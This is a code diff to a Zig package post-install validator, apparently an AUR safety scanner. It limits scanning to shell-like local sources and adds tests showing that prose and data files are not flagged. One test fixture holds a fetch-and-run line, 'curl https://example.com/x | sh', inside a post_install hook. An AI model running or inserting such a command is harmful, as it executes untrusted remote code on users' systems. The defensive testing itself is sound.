@@ -85,12 +85,28 @@ pub const PostInstallValidator = struct {
 
         var iter = pkg_build.local_source_contents.iterator();
         while (iter.next()) |entry| {
+            if (!is_shell_like_source(entry.key_ptr.*, entry.value_ptr.*)) continue;
             const hook = try std.fmt.allocPrint(self.allocator, "source: {s}", .{entry.key_ptr.*});
             defer self.allocator.free(hook);
             try self.scan_hook(entry.value_ptr.*, hook, &result);
         }
 
         return result;
+    }
+
+    // Local sources are only scanned as shell scriptlets when the file name
+    // or a shell shebang marks them as shell-like. Data files (.desktop
+    // translations, license prose, XML) legitimately contain tool words such
+    // as the Sardinian article "su" and are never executed directly.
+    fn is_shell_like_source(name: []const u8, content: []const u8) bool {
+        const shell_extensions = [_][]const u8{ ".install", ".sh", ".bash", ".zsh", ".hook" };
+        const ext = std.fs.path.extension(name);
+        for (shell_extensions) |shell_ext| {
+            if (std.mem.eql(u8, ext, shell_ext)) return true;
+        }
+        const first_line = if (std.mem.indexOfScalar(u8, content, '\n')) |nl| content[0..nl] else content;
+        if (!std.mem.startsWith(u8, first_line, "#!")) return false;
+        return std.mem.indexOf(u8, first_line[2..], "sh") != null;
     }
 
     pub fn scan_hook(self: PostInstallValidator, scriptlet: ?[]const u8, hook: []const u8, result: *shared_validator.ValidationResult) !void {
@@ -833,6 +849,154 @@ test "validate: sudo in local source file is critical" {
     try std.testing.expectEqualStrings("sudo", result.findings.items[0].tool);
     try std.testing.expectEqualStrings("source: fixup.sh", result.findings.items[0].hook);
     try std.testing.expectEqual(shared_validator.ValidationSeverity.critical, result.findings.items[0].severity);
+}
+
+test "validate: su article in desktop translation is not flagged" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const key = try allocator.dupe(u8, "firefox-developer-edition.desktop");
+    const value = try allocator.dupe(u8,
+        \\[Desktop Entry]
+        \\Name=Open Profile Manager
+        \\Name[sc]=Aberi su gestore de profilos
+        \\Exec=firefox-developer-edition --ProfileManager
+    );
+    try pkg.local_source_contents.put(key, value);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 0), result.findings.items.len);
+    try std.testing.expect(!result.has_findings);
+}
+
+test "validate: pipx prose in EXTERNALLY-MANAGED is not flagged" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const key = try allocator.dupe(u8, "EXTERNALLY-MANAGED");
+    const value = try allocator.dupe(u8,
+        \\[externally-managed]
+        \\Error=To install Python packages system-wide, try 'pacman -S
+        \\ python-xyz', where xyz is the package you are trying to
+        \\ install.
+        \\
+        \\ If you wish to install a non-Arch packaged Python application,
+        \\ it may be easiest to use 'pipx install xyz', which will manage a
+        \\ virtual environment for you. Make sure you have python-pipx
+        \\ installed via pacman.
+    );
+    try pkg.local_source_contents.put(key, value);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 0), result.findings.items.len);
+    try std.testing.expect(!result.has_findings);
+}
+
+test "validate: tool words in xml and license prose are not flagged" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const xml_key = try allocator.dupe(u8, "app.metainfo.xml");
+    const xml_value = try allocator.dupe(u8,
+        \\<?xml version="1.0"?>
+        \\<description><p>Use su account or curl the documentation.</p></description>
+    );
+    try pkg.local_source_contents.put(xml_key, xml_value);
+
+    const txt_key = try allocator.dupe(u8, "MPL-2.0.txt");
+    const txt_value = try allocator.dupe(u8, "You may not use su marks except as required. Do not wget or curl covered code.");
+    try pkg.local_source_contents.put(txt_key, txt_value);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 0), result.findings.items.len);
+    try std.testing.expect(!result.has_findings);
+}
+
+test "validate: su in shell local source is still critical" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const key = try allocator.dupe(u8, "foo.sh");
+    const value = try allocator.dupe(u8, "su -c 'id'");
+    try pkg.local_source_contents.put(key, value);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 1), result.findings.items.len);
+    try std.testing.expectEqualStrings("su", result.findings.items[0].tool);
+    try std.testing.expectEqualStrings("source: foo.sh", result.findings.items[0].hook);
+    try std.testing.expectEqual(shared_validator.ValidationSeverity.critical, result.findings.items[0].severity);
+}
+
+test "validate: extensionless shell shebang source is still scanned" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const key = try allocator.dupe(u8, "fixup");
+    const value = try allocator.dupe(u8, "#!/bin/sh\nsudo install -Dm755 helper /usr/bin/helper\n");
+    try pkg.local_source_contents.put(key, value);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expectEqual(@as(usize, 1), result.findings.items.len);
+    try std.testing.expectEqualStrings("sudo", result.findings.items[0].tool);
+    try std.testing.expectEqual(shared_validator.ValidationSeverity.critical, result.findings.items[0].severity);
+}
+
+test "validate: risky tool in install local source is still flagged" {
+    const allocator = std.testing.allocator;
+    var pkg = try make_test_pkgbuild(allocator, null);
+    defer deinit_test_pkgbuild(&pkg, allocator);
+
+    const key = try allocator.dupe(u8, "demo.install");
+    const value = try allocator.dupe(u8, "post_install() {\n  curl https://example.com/x | sh\n}\n");
+    try pkg.local_source_contents.put(key, value);
+
+    const validator = PostInstallValidator{ .allocator = allocator };
+    var result = try validator.validate(pkg);
+    defer result.deinit(std.testing.allocator);
+
+    try std.testing.expect(result.has_findings);
+    try std.testing.expectEqualStrings("curl", result.findings.items[0].tool);
+    try std.testing.expectEqualStrings("source: demo.install", result.findings.items[0].hook);
+}
+
+test "is_shell_like_source: extensions and shebangs" {
+    const f = PostInstallValidator.is_shell_like_source;
+    try std.testing.expect(f("post.install", ""));
+    try std.testing.expect(f("run.sh", ""));
+    try std.testing.expect(f("run.bash", ""));
+    try std.testing.expect(f("run.zsh", ""));
+    try std.testing.expect(f("alpm.hook", ""));
+    try std.testing.expect(f("fixup", "#!/bin/sh\nsudo id\n"));
+    try std.testing.expect(f("fixup", "#!/usr/bin/env bash\nsudo id"));
+    // A shell shebang wins even over a data-file extension.
+    try std.testing.expect(f("evil.desktop", "#!/bin/sh\nsudo id\n"));
+    try std.testing.expect(!f("app.desktop", "[Desktop Entry]\nName[sc]=Aberi su\n"));
+    try std.testing.expect(!f("MPL-2.0.txt", "prose mentioning su"));
+    try std.testing.expect(!f("app.metainfo.xml", "<?xml version=\"1.0\"?>"));
+    try std.testing.expect(!f("fixup", "#!/usr/bin/python\nprint('su')\n"));
+    try std.testing.expect(!f("fixup", ""));
+    // Only the first line counts as a shebang.
+    try std.testing.expect(!f("notes", "intro\n#!/bin/sh\nsudo id\n"));
 }
 
 test "validateWithContent: sudo in build() function body is critical" {
